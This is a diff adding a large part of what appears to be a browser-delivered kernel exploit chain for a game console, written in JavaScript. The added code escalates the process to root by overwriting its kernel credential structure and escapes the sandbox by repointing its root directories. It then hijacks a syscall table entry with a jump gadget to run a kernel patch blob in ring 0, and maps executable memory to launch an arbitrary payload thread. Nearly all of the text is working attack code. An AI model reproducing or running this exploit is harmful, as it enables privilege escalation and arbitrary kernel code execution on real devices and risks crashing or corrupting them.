@@ -2922,3 +2922,751 @@ function makeRpc(worker) {
                                     let leftover = 0;
                                     for (let o = 0; o < 0x100; o += 8) {
                                                 
+                                        if (o === PKTOPTS_TCLASS) continue;
+                                        if ((chunkX.dv.getUint32(o, true) >>> 0)
+                                            || (chunkX.dv.getUint32(o + 4, true) >>> 0))
+                                            leftover++;
+                                    }
+                                    check("aliased-pktopts-entirely-zero"
+                                        + "except its tclass", leftover === 0,
+                                        leftover + " non-zero word(s) left -- head "
+                                        + hexBytes(chunkX.u8.subarray(0, 16)));
+
+                                    repaired = held === 4 && cleared && leftover === 0;
+                                    mark(repaired ? "REPAIR-DONE" : "REPAIR-PARTIAL",
+                                        repaired
+                                            ? "every doubly-owned allocation now has "
+                                              + "exactly one owner. cleanup() is "
+                                              + "unlocked."
+                                            : "the teardown stays locked; the reboot "
+                                              + "banner is still correct.");
+                                    if (repaired) {
+                                        pipeFdsHeld = pipeFds.slice();
+
+                                        kvProbe = function () {
+                                            const w = kview(evfCv).getBInt(0, true);
+                                            let s = "";
+                                            for (let i = 0; i < 8; ++i) {
+                                                const c = kv.view.dv.getUint8(i);
+                                                if (!c) break;
+                                                s += String.fromCharCode(c);
+                                            }
+                                            return { word: w, str: s };
+                                        };
+                                    }
+                                }
+
+                                if (!repaired) {
+                                    mark("JAILBREAK-SKIPPED", "the repair did not "
+                                        + "verify, so this run is already going to "
+                                        + "ask for a reboot. Doing more kernel "
+                                        + "writes on top of that is how a clean "
+                                        + "failure becomes a panic.");
+                                } else try {
+                                    state("stage 8: jailbreak...", "warn");
+
+                                    const P_LIST_NEXT = 0x00, P_LIST_PREV = 0x08;
+                                    const P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
+                                    const CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c;
+                                    const CR_NGROUPS = 0x10, CR_RGID = 0x14, CR_SVGID = 0x18;
+                                    const CR_PRISON = 0x30, CR_SCEAUTHID = 0x58;
+                                    const CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
+                                    const CR_SCEATTR0 = 0x83;
+                                    const FD_RDIR = 0x10, FD_JDIR = 0x18;
+                                    const KERNEL_PID = 0;
+
+                                    const SYSCORE_AUTHID = new int64(0x00000007, 0x48000000);
+
+                                    let walk = curproc, steps = 0, allproc = null;
+                                    while (steps < 4096) {
+                                        if (inImageAddr(walk)) { allproc = walk; break; }
+                                        if (!kptr(walk)) break;
+                                        walk = kview(walk).getBInt(P_LIST_PREV, true);
+                                        steps++;
+                                    }
+                                    mark("ALLPROC", (allproc || "NOT FOUND")
+                                        + "   after " + steps + " le_prev step(s) "
+                                        + "back from " + curproc
+                                        + (allproc && kbase ? "   = kernel_base + 0x"
+                                            + (allproc.low - kbase.low >>> 0).toString(16)
+                                            : ""));
+                                    check("allproc-reached-by-walking-p_list"
+                                        + "backwards", !!allproc,
+                                        allproc ? "it is a kernel image address, "
+                                            + "which is what &allproc must be"
+                                            : "the walk left the proc list");
+
+                                    const procs = [];
+                                    function pfind(pid) {
+                                        if (!allproc) return null;
+                                        let p2 = kview(allproc).getBInt(0, true);
+                                        for (let n = 0; n < 4096; ++n) {
+                                            if (!p2 || !kptr(p2)) return null;
+                                            const q = kview(p2).getInt32(P_PID, true);
+                                            if (n < 8) procs.push(q);
+                                            if (q === pid) return p2;
+                                            p2 = kview(p2).getBInt(P_LIST_NEXT, true);
+                                            if (!p2 || p2.low === 0 && p2.hi === 0)
+                                                return null;
+                                        }
+                                        return null;
+                                    }
+                                    const selfProc = pfind(myPid);
+                                    const kProc = pfind(KERNEL_PID);
+                                    mark("PFIND", "pid " + myPid + " -> "
+                                        + (selfProc || "null") + "   pid 0 -> "
+                                        + (kProc || "null")
+                                        + "   first pids on the list: " + procs.slice(0, 8));
+                                    check("pfind-found-proc"
+                                        + "one the sigio named",
+                                        !!selfProc && sameI64(selfProc, curproc),
+                                        selfProc ? selfProc + " vs " + curproc
+                                            : "not found -- allproc or p_pid is wrong");
+                                    check("pfind-found-kernel-proc-pid",
+                                        !!kProc && kptr(kProc),
+                                        kProc ? kProc.toString() : "not found");
+
+                                    if (selfProc && sameI64(selfProc, curproc) && kProc) {
+
+                                        const uidBefore = sc(SYS.getuid).i32;
+                                        const setuidBefore = sc(SYS.setuid, 0).i32;
+                                        const uidAfterTry = sc(SYS.getuid).i32;
+                                        mark("PRE-JAILBREAK", "getuid=" + uidBefore
+                                            + "  setuid(0)=" + setuidBefore
+                                            + "  getuid=" + uidAfterTry);
+                                        check("process-unprivileged-before"
+                                            + "the patch", uidBefore !== 0
+                                            && setuidBefore === -1,
+                                            "uid " + uidBefore + ", setuid(0) refused "
+                                            + "-- exactly the test main.js:109 uses "
+                                            + "to decide whether to jailbreak");
+
+                                        const pathBuf = alloc(0x40);
+                                        function tryOpen(path) {
+                                            pathBuf.u8.fill(0);
+                                            for (let i = 0; i < path.length; ++i)
+                                                pathBuf.u8[i] = path.charCodeAt(i);
+                                            const fd = sc(SYS.open, pathBuf.addr, 0, 0).i32;
+                                            if (fd >= 0) sc(SYS.close, fd);
+                                            return fd;
+                                        }
+                                        const PROBE_PATHS = ["/", "/system",
+                                            "/mini-syscore.elf", "/system_ex"];
+                                        const before = PROBE_PATHS.map(function (s) {
+                                            return s + "=" + tryOpen(s);
+                                        });
+                                        mark("SANDBOX-BEFORE", before.join("  "));
+
+                                        const pUcred = kview(selfProc).getBInt(P_UCRED, true);
+                                        const kUcred = kview(kProc).getBInt(P_UCRED, true);
+                                        const prison0 = kview(kUcred).getBInt(CR_PRISON, true);
+                                        const pFdb = kview(selfProc).getBInt(P_FD, true);
+                                        const kFdb = kview(kProc).getBInt(P_FD, true);
+                                        const rootVnode = kview(kFdb).getBInt(FD_RDIR, true);
+                                        mark("JAILBREAK-SOURCES", "p_ucred=" + pUcred
+                                            + " kp_ucred=" + kUcred + " prison0=" + prison0
+                                            + " p_fd=" + pFdb + " root_vnode=" + rootVnode);
+                                        const srcOk = kptr(pUcred) && kptr(kUcred)
+                                            && kptr(prison0) && kptr(pFdb) && kptr(rootVnode);
+                                        check("structure-jailbreak-writes"
+                                            + "through is a kernel pointer", srcOk,
+                                            srcOk ? "" : "refusing to write");
+
+                                        if (srcOk) {
+                                            kview(pUcred).setInt32(CR_UID, 0, true);
+                                            kview(pUcred).setInt32(CR_RUID, 0, true);
+                                            kview(pUcred).setInt32(CR_SVUID, 0, true);
+                                            kview(pUcred).setInt32(CR_NGROUPS, 1, true);
+                                            kview(pUcred).setInt32(CR_RGID, 0, true);
+                                            kview(pUcred).setInt32(CR_SVGID, 0, true);
+                                            kview(pUcred).setBInt(CR_PRISON, prison0, true);
+                                            kview(pUcred).setBInt(CR_SCEAUTHID,
+                                                SYSCORE_AUTHID, true);
+                                            kview(pUcred).setBInt(CR_SCECAPS1, -1, true);
+                                            kview(pUcred).setBInt(CR_SCECAPS0, -1, true);
+                                            kview(pUcred).setUint8(CR_SCEATTR0, 0x80);
+                                            kview(pFdb).setBInt(FD_RDIR, rootVnode, true);
+                                            kview(pFdb).setBInt(FD_JDIR, rootVnode, true);
+
+                                            const back = {
+                                                uid: kview(pUcred).getInt32(CR_UID, true),
+                                                prison: kview(pUcred).getBInt(CR_PRISON, true),
+                                                auth: kview(pUcred).getBInt(CR_SCEAUTHID, true),
+                                                caps: kview(pUcred).getBInt(CR_SCECAPS0, true),
+                                                attr: kview(pUcred).getUint8(CR_SCEATTR0),
+                                                rdir: kview(pFdb).getBInt(FD_RDIR, true)
+                                            };
+                                            mark("JAILBREAK-WRITE", "cr_uid=" + back.uid
+                                                + " cr_prison=" + back.prison
+                                                + " cr_sceAuthId=" + back.auth
+                                                + " cr_sceCaps[0]=" + back.caps
+                                                + " cr_sceAttr[0]=0x" + back.attr.toString(16)
+                                                + " fd_rdir=" + back.rdir);
+                                            check("ucred-reads-patched",
+                                                back.uid === 0
+                                                && sameI64(back.prison, prison0)
+                                                && sameI64(back.auth, SYSCORE_AUTHID)
+                                                && back.attr === 0x80
+                                                && sameI64(back.rdir, rootVnode), "");
+
+                                            const uidNow = sc(SYS.getuid).i32;
+                                            const euidNow = sc(SYS.geteuid).i32;
+                                            const setuidNow = sc(SYS.setuid, 0).i32;
+                                            mark("POST-JAILBREAK", "getuid=" + uidNow
+                                                + " geteuid=" + euidNow
+                                                + " setuid(0)=" + setuidNow);
+                                            const rooted = uidNow === 0 && setuidNow === 0;
+                                            check("kernel-reports-root",
+                                                rooted, rooted
+                                                    ? "getuid() went " + uidBefore
+                                                    + " -> 0 and setuid(0) went -1 -> 0, "
+                                                    + "neither of which userland can fake"
+                                                    : "uid " + uidNow);
+
+                                            const after = PROBE_PATHS.map(function (s) {
+                                                return s + "=" + tryOpen(s);
+                                            });
+                                            mark("SANDBOX-AFTER", after.join("  "));
+                                            const escaped = PROBE_PATHS.some(function (s, i) {
+                                                return before[i].endsWith("=-1")
+                                                    && !after[i].endsWith("=-1");
+                                            });
+                                            check("path-unreachable-before"
+                                                + "opens now", escaped,
+                                                escaped ? "fd_rdir/fd_jdir now point at "
+                                                    + "the kernel's root vnode"
+                                                    : "no probe path changed -- the app "
+                                                    + "sandbox may already have allowed "
+                                                    + "all of them, so this proves "
+                                                    + "nothing either way");
+                                            jailbroken = rooted;
+                                        }
+                                    }
+                                } catch (e) {
+                                    mark("JAILBREAK-THREW", (e && e.message)
+                                        ? e.message : String(e));
+                                }
+
+                                const KOFF = offsetsFor(navigator.userAgent).off || {};
+                                const SYSENT_661 = KOFF.k_sysent_661 !== undefined
+                                    ? KOFF.k_sysent_661 : 0x1109350;
+                                const JMP_RSI_GADGET = KOFF.k_jmp_rsi !== undefined
+                                    ? KOFF.k_jmp_rsi : 0x71a21;
+                                mark("KOFF", "sysent[661]=0x" + SYSENT_661.toString(16)
+                                    + " jmp[rsi]=0x" + JMP_RSI_GADGET.toString(16)
+                                    + "   source=" + (KOFF.k_sysent_661 !== undefined
+                                        ? "offsets table" : "built-in 11.00 fallback"));
+                                const PROT_READ = 1, PROT_WRITE = 2, PROT_EXEC = 4;
+                                const MAP_SHARED = 1, MAP_FIXED = 0x10;
+                                const SYS_MMAP = 0x1dd, SYS_JITSHM_CREATE = 0x215;
+                                const SYS_KEXEC = 0x295;
+                                const KEXEC_MAP = new int64(0x20100000, 9);
+
+                                if (!(jailbroken && kbase && kpatch)) {
+                                    mark("KPATCH-SKIPPED", "need root, a kernel base "
+                                        + "and the blob; have root=" + jailbroken
+                                        + " kbase=" + (kbase || "null")
+                                        + " blob=" + (kpatch ? kpatch.length : 0));
+                                } else try {
+                                    state("stage 9: kernel patches...", "warn");
+                                    const sysent = kbase.add32(SYSENT_661);
+                                    const gadget = kbase.add32(JMP_RSI_GADGET);
+
+                                    const gbuf = alloc(8);
+                                    gbuf.u8.fill(0);
+                                    kv.kread(gbuf.addr, gadget, 8);
+                                    const gadgetOk = gbuf.u8[0] === 0xff && gbuf.u8[1] === 0x26;
+                                    const wouldExecArgs = gbuf.u8[0] === 0xff
+                                        && gbuf.u8[1] === 0xe6;
+                                    mark("KPATCH-GADGET", gadget + " reads "
+                                        + hexBytes(gbuf.u8.subarray(0, 8))
+                                        + "   want ff 26 (jmp qword [rsi])");
+                                    check("sysent-replacement-sy_call"
+                                        + "jmp qword [rsi]", gadgetOk,
+                                        gadgetOk ? "so syscall 661 transfers to "
+                                            + "args[0], which is the address we pass "
+                                            + "to kexec"
+                                            : wouldExecArgs
+                                            ? "REFUSING -- this is ff e6, `jmp rsi`, "
+                                            + "which would execute the argument array "
+                                            + "itself rather than jump through it"
+                                            : "REFUSING -- a wrong sy_call is a panic "
+                                            + "on the next syscall 661");
+
+                                    const syNarg = kview(sysent).getUint32(0, true);
+                                    const syCall = kview(sysent).getBInt(8, true);
+                                    const syThrcnt = kview(sysent).getUint32(0x2c, true);
+                                    mark("KPATCH-SYSENT", sysent + "  sy_narg=" + syNarg
+                                        + " sy_call=" + syCall + " sy_thrcnt=" + syThrcnt);
+                                    const sysentOk = syNarg <= 8 && inImageAddr(syCall)
+                                        && syThrcnt <= 8;
+                                    check("sysent661-sysent-entry",
+                                        sysentOk, sysentOk
+                                            ? "sy_call points into the kernel image and "
+                                            + "sy_narg is a plausible argument count"
+                                            : "REFUSING -- this is not sysent, and "
+                                            + "writing here would corrupt something else");
+
+                                    const site = alloc(8);
+                                    const siteLog = [], siteBad = [];
+                                    for (let i = 0; i < KPATCH_JMP_SITES.length; ++i) {
+                                        const off2 = KPATCH_JMP_SITES[i];
+                                        site.u8.fill(0);
+                                        kv.kread(site.addr, kbase.add32(off2), 1);
+                                        const b = site.u8[0];
+                                        const good = (b >= 0x70 && b <= 0x7f) || b === 0xeb;
+                                        siteLog.push("0x" + off2.toString(16) + ":"
+                                            + hexByte(b) + (b === 0xeb ? "*" : ""));
+                                        if (!good) siteBad.push("0x" + off2.toString(16)
+                                            + "=" + hexByte(b));
+                                    }
+                                    mark("KPATCH-SITES", siteLog.join(" ")
+                                        + "   (* = already 0xeb)");
+
+                                    const sitesOk = siteBad.length === 0
+                                        && KPATCH_JMP_SITES.length >= 4;
+                                    check("site-blob-makes-unconditional"
+                                        + "currently holds a conditional jump", sitesOk,
+                                        sitesOk ? "so the blob was built for this kernel "
+                                            + "and kbase agrees with the LSTAR-0x1c0 the "
+                                            + "blob will compute for itself"
+                                            : "REFUSING -- " + siteBad.join(" "));
+
+                                    if (!(gadgetOk && sysentOk && sitesOk)) {
+                                        mark("KPATCH-REFUSED", "one of the three gates "
+                                            + "failed. sysent was not touched, no memory "
+                                            + "was mapped and nothing was executed.");
+                                    } else {
+
+                                        const size = (kpatch.length + 0x3fff) & ~0x3fff;
+                                        const prot = PROT_READ | PROT_WRITE | PROT_EXEC;
+                                        const execFd = scAny(SYS_JITSHM_CREATE, 0, size,
+                                            prot).i32;
+                                        const mm = scAny(SYS_MMAP, KEXEC_MAP, size, prot,
+                                            MAP_SHARED | MAP_FIXED, execFd, 0);
+                                        const mapped = new int64(mm.lo, mm.hi);
+                                        mark("KPATCH-MAP", "jitshm_create(0, 0x"
+                                            + size.toString(16) + ", rwx) = " + execFd
+                                            + "   mmap(" + KEXEC_MAP + ") = " + mapped);
+                                        const mapOk = execFd >= 0 && mm.i32 !== -1
+                                            && sameI64(mapped, KEXEC_MAP);
+                                        check("632-bytes-rwx-memory-address"
+                                            + "the reference uses", mapOk,
+                                            mapOk ? "" : "jitshm/mmap refused");
+
+                                        if (mapOk) {
+
+                                            for (let o = 0; o < kpatch.length; o += 8) {
+                                                let lo = 0, hi = 0;
+                                                for (let k = 0; k < 4; ++k)
+                                                    lo |= (kpatch[o + k] || 0) << (8 * k);
+                                                for (let k = 0; k < 4; ++k)
+                                                    hi |= (kpatch[o + 4 + k] || 0) << (8 * k);
+                                                p.write8(mapped.add32(o),
+                                                    new int64(lo >>> 0, hi >>> 0));
+                                            }
+
+                                            let copied = true;
+                                            for (let o = 0; o < kpatch.length && copied;
+                                                 o += 8) {
+                                                const w = p.read8(mapped.add32(o));
+                                                for (let k = 0; k < 8; ++k) {
+                                                    const want = kpatch[o + k];
+                                                    if (want === undefined) continue;
+                                                    const got = k < 4
+                                                        ? (w.low >>> (8 * k)) & 0xff
+                                                        : (w.hi >>> (8 * (k - 4))) & 0xff;
+                                                    if (got !== want) { copied = false; break; }
+                                                }
+                                            }
+                                            const headBack = p.read8(mapped);
+                                            mark("KPATCH-COPY", kpatch.length
+                                                + " bytes written to " + mapped
+                                                + ", first qword reads " + headBack);
+                                            check("blob-rwx-memory-byte"
+                                                + "byte", copied, "");
+
+                                            if (copied && params.get("patch") === "0") {
+                                                mark("KEXEC-WITHHELD", "?patch=0 -- "
+                                                    + "sysent was NOT modified and the "
+                                                    + "blob was NOT executed. Everything "
+                                                    + "up to that point is proven above.");
+                                            } else if (copied) {
+
+                                                kview(sysent).setUint32(0, 2, true);
+                                                kview(sysent).setBInt(8, gadget, true);
+                                                kview(sysent).setUint32(0x2c, 1, true);
+                                                const armed = sameI64(
+                                                    kview(sysent).getBInt(8, true), gadget);
+                                                mark("SYSENT-ARMED", "sy_call -> " + gadget
+                                                    + (armed ? "  confirmed" : "  MISMATCH"));
+
+                                                let kexecRet = -2;
+                                                if (armed) kexecRet = scAny(SYS_KEXEC,
+                                                    mapped).i32;
+
+                                                kview(sysent).setUint32(0, syNarg, true);
+                                                kview(sysent).setBInt(8, syCall, true);
+                                                kview(sysent).setUint32(0x2c, syThrcnt, true);
+                                                const restored =
+                                                    sameI64(kview(sysent).getBInt(8, true),
+                                                        syCall)
+                                                    && kview(sysent).getUint32(0, true)
+                                                        === syNarg
+                                                    && kview(sysent).getUint32(0x2c, true)
+                                                        === syThrcnt;
+                                                mark("KEXEC", "syscall(661, " + mapped
+                                                    + ") = " + kexecRet
+                                                    + "   sysent restored=" + restored);
+                                                check("sysent661-put"
+                                                    + "as it was", restored,
+                                                    restored ? "" : "sy_call is still the "
+                                                        + "gadget -- do not call 661");
+                                                check("blob-ran-ring-0"
+                                                    + "returned 0", kexecRet === 0,
+                                                    "kexec returned " + kexecRet);
+
+                                                const after2 = [], stillCond = [];
+                                                for (let i = 0;
+                                                     i < KPATCH_JMP_SITES.length; ++i) {
+                                                    const off2 = KPATCH_JMP_SITES[i];
+                                                    site.u8.fill(0);
+                                                    kv.kread(site.addr, kbase.add32(off2), 1);
+                                                    const b = site.u8[0];
+                                                    after2.push("0x" + off2.toString(16)
+                                                        + ":" + hexByte(b));
+                                                    if (b !== 0xeb) stillCond.push(
+                                                        "0x" + off2.toString(16));
+                                                }
+                                                mark("KPATCH-VERIFY", after2.join(" "));
+                                                const patchedOk = stillCond.length === 0;
+                                                check("gated-site-reads-0xeb"
+                                                    + "read back out of live kernel "
+                                                    + "memory", patchedOk,
+                                                    patchedOk ? "the kernel's own text "
+                                                        + "changed under us -- that is "
+                                                        + "the patch, and nothing in "
+                                                        + "userland could have done it"
+                                                        : "still conditional: "
+                                                        + stillCond.join(" "));
+                                                kpatched = kexecRet === 0 && patchedOk
+                                                    && restored;
+                                                if (kpatched) {
+                                                    mark("KERNEL-PATCHED",
+                                                        (kpatchName || "the blob")
+                                                        + " applied and verified "
+                                                        + "(main.js:106-116).");
+                                                    if (PATCH_SETTLE > 0) {
+                                                        mark("PATCH-SETTLE",
+                                                            "ms=" + PATCH_SETTLE);
+                                                        settle(PATCH_SETTLE);
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    }
+                                } catch (e) {
+                                    mark("KPATCH-THREW", (e && e.message)
+                                        ? e.message : String(e));
+                                }
+
+                                const MAP_PRIVATE = 2, MAP_ANONYMOUS = 0x1000;
+                                if (!kpatched) {
+                                    mark("PAYLOAD-SKIPPED", "reason=kpatch-incomplete");
+                                }
+                                if (!payload) {
+                                    mark("PAYLOAD-NONE", "payload.bin was not loaded");
+                                }
+
+                                if (payload && params.get("payload") === "0")
+                                    mark("PAYLOAD-SKIPPED", "reason=payload=0");
+                                else if (payload && (kpatched || params.get("payload") === "1"))
+                                    try {
+                                    state("stage 10: loading the payload...", "warn");
+
+                                    const psize = (payload.length + 0x3fff) & ~0x3fff;
+                                    const pr = PROT_READ | PROT_WRITE | PROT_EXEC;
+                                    const em = scAny(SYS9.mmap, 0, psize, pr,
+                                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+                                    const entry = new int64(em.lo, em.hi);
+                                    mark("PAYLOAD-MAP", "mmap(0, 0x" + psize.toString(16)
+                                        + ", rwx, PRIVATE|ANON) = " + entry);
+                                    const entryOk = em.i32 !== -1
+                                        && !(entry.low === 0 && entry.hi === 0);
+                                    check("the payload has " + payload.length
+                                        + " bytes of anonymous RWX to live in",
+                                        entryOk, entryOk ? "" : "mmap refused");
+
+                                    if (entryOk) {
+
+                                        const tCopy = Date.now();
+                                        for (let o = 0; o < payload.length; o += 8) {
+                                            let lo = 0, hi = 0;
+                                            for (let k = 0; k < 4; ++k)
+                                                lo |= (payload[o + k] || 0) << (8 * k);
+                                            for (let k = 0; k < 4; ++k)
+                                                hi |= (payload[o + 4 + k] || 0) << (8 * k);
+                                            p.write8(entry.add32(o),
+                                                new int64(lo >>> 0, hi >>> 0));
+                                        }
+                                        const copyMs = Date.now() - tCopy;
+                                        const tVer = Date.now();
+                                        let bad = -1;
+                                        for (let o = 0; o < payload.length && bad < 0;
+                                             o += 8) {
+                                            const w = p.read8(entry.add32(o));
+                                            for (let k = 0; k < 8; ++k) {
+                                                const want = payload[o + k];
+                                                if (want === undefined) continue;
+                                                const got = k < 4
+                                                    ? (w.low >>> (8 * k)) & 0xff
+                                                    : (w.hi >>> (8 * (k - 4))) & 0xff;
+                                                if (got !== want) { bad = o + k; break; }
+                                            }
+                                        }
+                                        const verMs = Date.now() - tVer;
+                                        mark("PAYLOAD-COPY", payload.length
+                                            + " bytes to " + entry + " in " + copyMs
+                                            + " ms, verified in " + verMs + " ms"
+                                            + (bad < 0 ? "" : "  MISMATCH at +0x"
+                                                + bad.toString(16)));
+                                        check("byte-payload-rwx"
+                                            + "memory", bad < 0,
+                                            bad < 0 ? "read back through the same "
+                                                + "primitive that wrote it" : "");
+
+                                        const PTHREAD_CREATE_RVA = 0x2068;
+                                        const cand = webkitBase.add32(PTHREAD_CREATE_RVA);
+                                        const cb = [];
+                                        for (let i = 0; i < 16; ++i)
+                                            cb.push(p.read1(cand.add32(i)));
+                                        mark("PTHREAD-BYTES", cand + " (webkit+0x"
+                                            + PTHREAD_CREATE_RVA.toString(16) + ") reads "
+                                            + hexBytes(cb));
+
+                                        const alt = libkernelBase.add32(PTHREAD_CREATE_RVA);
+                                        const ab = [];
+                                        for (let i = 0; i < 16; ++i)
+                                            ab.push(p.read1(alt.add32(i)));
+                                        mark("PTHREAD-BYTES-ALT", alt + " (libkernel+0x"
+                                            + PTHREAD_CREATE_RVA.toString(16) + ") reads "
+                                            + hexBytes(ab));
+
+                                        let target = null, how = "";
+                                        if (cb[0] === 0xff && cb[1] === 0x25) {
+
+                                            const rel = (cb[2] | (cb[3] << 8)
+                                                | (cb[4] << 16) | (cb[5] << 24)) | 0;
+                                            const got = rel >= 0 ? cand.add32(6 + rel)
+                                                : cand.add32(6).sub32(-rel);
+                                            const fn2 = p.read8(got);
+                                            const nearK = fn2.hi === libkernelBase.hi;
+                                            const nearW = fn2.hi === webkitBase.hi;
+                                            mark("PTHREAD-THUNK", "jmp qword [rip"
+                                                + (rel < 0 ? "" : "+") + rel + "]  GOT "
+                                                + got + " -> " + fn2
+                                                + (nearK ? "  (libkernel+0x"
+                                                    + ((fn2.low - libkernelBase.low) >>> 0)
+                                                        .toString(16) + ")"
+                                                 : nearW ? "  (webkit+0x"
+                                                    + ((fn2.low - webkitBase.low) >>> 0)
+                                                        .toString(16) + ")" : ""));
+                                            if (fn2.hi > 0 && (fn2.low & 7) === 0
+                                                || nearK || nearW) {
+                                                target = cand; how = "import thunk";
+                                            }
+                                        } else if (cb[0] === 0xf3 && cb[1] === 0x0f
+                                            && cb[2] === 0x1e && cb[3] === 0xfa) {
+                                            target = cand; how = "endbr64 prologue";
+                                        } else if (cb[0] === 0x55
+                                            || (cb[0] === 0x48 && cb[1] === 0x83)
+                                            || (cb[0] === 0x41 && cb[1] === 0x57)) {
+                                            target = cand; how = "function prologue";
+                                        }
+
+                                        if (off.wk___imp_pthread_create !== undefined
+                                            && off.k_pthread_create !== undefined) {
+                                            const slot = webkitBase.add32(
+                                                off.wk___imp_pthread_create);
+                                            const fnT = p.read8(slot);
+                                            const expect = libkernelBase.add32(
+                                                off.k_pthread_create);
+                                            const agree = sameI64(fnT, expect);
+                                            mark("PTHREAD-TABLE", "GOT slot " + slot
+                                                + " -> " + fnT + "   libkernel+0x"
+                                                + off.k_pthread_create.toString(16)
+                                                + " = " + expect
+                                                + (agree ? "   AGREE" : "   DISAGREE"
+                                                    + " -- not using it"));
+                                            if (agree) {
+                                                target = expect;
+                                                how = "offsets table, GOT slot "
+                                                    + "cross-checked against "
+                                                    + "libkernel's own RVA";
+                                            }
+                                        }
+
+                                        const forced = params.get("forcepthread") === "1";
+                                        check("pthread_create was identified",
+                                            !!target,
+                                            target ? how + " -- calling it"
+                                                : "neither a thunk nor a prologue. The "
+                                                + "payload stays mapped at " + entry
+                                                + " and is NOT launched. Read "
+                                                + "PTHREAD-BYTES above and fix the "
+                                                + "offset, or ?forcepthread=1.");
+
+                                        if (!target && forced) {
+                                            target = cand; how = "forced";
+                                            mark("PTHREAD-FORCED", "?forcepthread=1 -- "
+                                                + "calling " + cand + " anyway");
+                                        }
+
+                                        if (target && bad < 0) {
+                                            const thr = alloc(8);
+                                            thr.u8.fill(0);
+                                            const rc = callAddr(target, thr.addr, 0,
+                                                entry, 0).i32;
+                                            const handle = new int64(
+                                                thr.dv.getUint32(0, true),
+                                                thr.dv.getUint32(4, true));
+                                            let tid = null;
+                                            if (handle.hi > 0) tid = p.read8(handle);
+                                            mark("PTHREAD-CREATE", "pthread_create(&t, "
+                                                + "0, " + entry + ", 0) = " + rc
+                                                + "   handle=" + handle
+                                                + "   id=" + (tid || "?"));
+                                            const launched = rc === 0 && handle.hi > 0;
+                                            check("payload-thread-created",
+                                                launched, launched
+                                                    ? "pthread_create returned 0 and "
+                                                    + "wrote back a thread handle"
+                                                    : "returned " + rc);
+                                            payloadRunning = launched;
+                                            if (launched) {
+                                                mark("PAYLOAD-RUNNING", "bytes="
+                                                    + payload.length + " entry="
+                                                    + entry);
+
+                                                if (PAYLOAD_SETTLE > 0) {
+                                                    mark("PAYLOAD-SETTLE",
+                                                        "ms=" + PAYLOAD_SETTLE);
+                                                    settle(PAYLOAD_SETTLE);
+                                                    mark("PAYLOAD-ALIVE",
+                                                        "getpid=" + scAny(SYS.getpid).i32
+                                                        + " after=" + PAYLOAD_SETTLE + "ms");
+                                                }
+                                            } else {
+                                                hostFail();
+                                            }
+                                        } else if (!target) {
+                                            mark("PAYLOAD-MAPPED-NOT-LAUNCHED",
+                                                "the payload is at " + entry
+                                                + " with RWX and verified byte for "
+                                                + "byte. Only the launch is missing.");
+                                        }
+                                    }
+                                } catch (e) {
+                                    mark("PAYLOAD-THREW", (e && e.message)
+                                        ? e.message : String(e));
+                                }
+                                }
+                            }
+                            }
+                        } catch (e) {
+                            mark("KERNELVIEW-THREW", (e && e.message)
+                                ? e.message : String(e));
+                            mark("KERNELVIEW-ABORTED", "the pipe primitive did "
+                                + "not come up. Nothing below depends on it and "
+                                + "the kernel R/W proofs above still stand.");
+                        }
+                } else {
+                    mark("FASTRW-SKIPPED", "no pipe struct addresses -- curproc "
+                        + "was unavailable, so the ofiles walk never ran and "
+                        + "there is nothing to aim the pipebuf at");
+                }
+
+                mark("STAGE-5-DONE", "karw=pktopts-fd" + pktoptsTwins[0]
+                    + " kv=" + (kv ? "up" : "down"));
+
+                return true;
+
+            })();
+            check("stage 2 completed", leakOk, "");
+
+        } else if (committed) {
+            mark("DANGLING", "the chunk was freed twice and NOT reclaimed. "
+                + "kernel data may alias it. reboot the console now.");
+            rebootRequired = true;
+        }
+
+        if (twins) {
+            mark("VERDICT", payloadRunning
+                ? "karw=1 root=1 sandbox=escaped kpatch=1 payload=1 reboot=0"
+                : kpatched
+                ? "karw=1 root=1 sandbox=escaped kpatch=1 payload=0"
+                : jailbroken
+                ? "karw=1 root=1 sandbox=escaped kpatch=0"
+                : repaired
+                ? "karw=1 repair=1 root=0"
+                : kv
+                ? "karw=1 repair=0 root=0"
+                : "doublefree=1 reclaim=1 karw=pktopts kv=0");
+
+            state(repaired ? "REPAIRED -- tearing down..."
+                : kv ? "KERNELVIEW LIVE -- REBOOT"
+                     : "DOUBLE FREE ACHIEVED -- REBOOT", "warn");
+            if (jailbroken) mark("JAILBROKEN", "uid=0 cr_sceAuthId=SYSCORE "
+                + "cr_sceCaps=-1 fd_rdir=rootvnode fd_jdir=rootvnode");
+        } else if (committed) {
+            state("FREED BUT NOT RECLAIMED -- REBOOT NOW", "bad");
+            hostFail();
+        } else {
+            state("no win in " + attemptsUsed + " attempts", "warn");
+            hostFail();
+        }
+
+    } catch (e) {
+        mark("FAILED", e && e.message ? e.message : String(e));
+        try {
+            stateEl.textContent = "FAILED -- see log";
+            stateEl.className = "bad";
+        } catch (e2) { }
+        hostFail();
+    } finally {
+
+        const teardown = !committed || repaired;
+        try {
+            if (!teardown) {
+                mark("CLEANUP-SKIPPED", "the 0x80 chunk was freed twice and the "
+                    + "repair did not verify. every further syscall is another "
+                    + "chance for the kernel to touch it, so nothing is torn "
+                    + "down beyond the scheduler and the userland corruptions.");
+            } else if (sc && mFunctionPatched) {
+
+                let n = 0;
+                for (let i = 0; i < openFds.length; ++i)
+                    if (openFds[i] > 0 && sc(SYS.close, openFds[i]).i32 === 0) n++;
+                mark("FDS-CLOSED", n + "/" + openFds.length + " block/loopback fds"
+                    + (pipeFdsHeld ? "   pipes " + pipeFdsHeld
+                        + " deliberately left open, +1 reference each" : ""));
+            }
+        } catch (e) {
+            mark("FD-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
+        }
+        try {
+            if (sc && mFunctionPatched && liveAioIds.length && teardown) {
+                const idBuf = new ArrayBuffer(AIO_MAX_NUM * 4);
+                const idDv = new DataView(idBuf);
+                const idAddr = (function () {
+                    const cell = p.leakval(idBuf);
+                    const impl = p.read8(cell.add32(0x10));
+                    return p.read8(impl.add32(0x10));
+                })();
+                const outBuf = new ArrayBuffer(AIO_MAX_NUM * 4);
+                const outAddr = (function () {
+                    const cell = p.leakval(outBuf);
+                    const impl = p.read8(cell.add32(0x10));
+                    return p.read8(impl.add32(0x10));
+                })();
+               
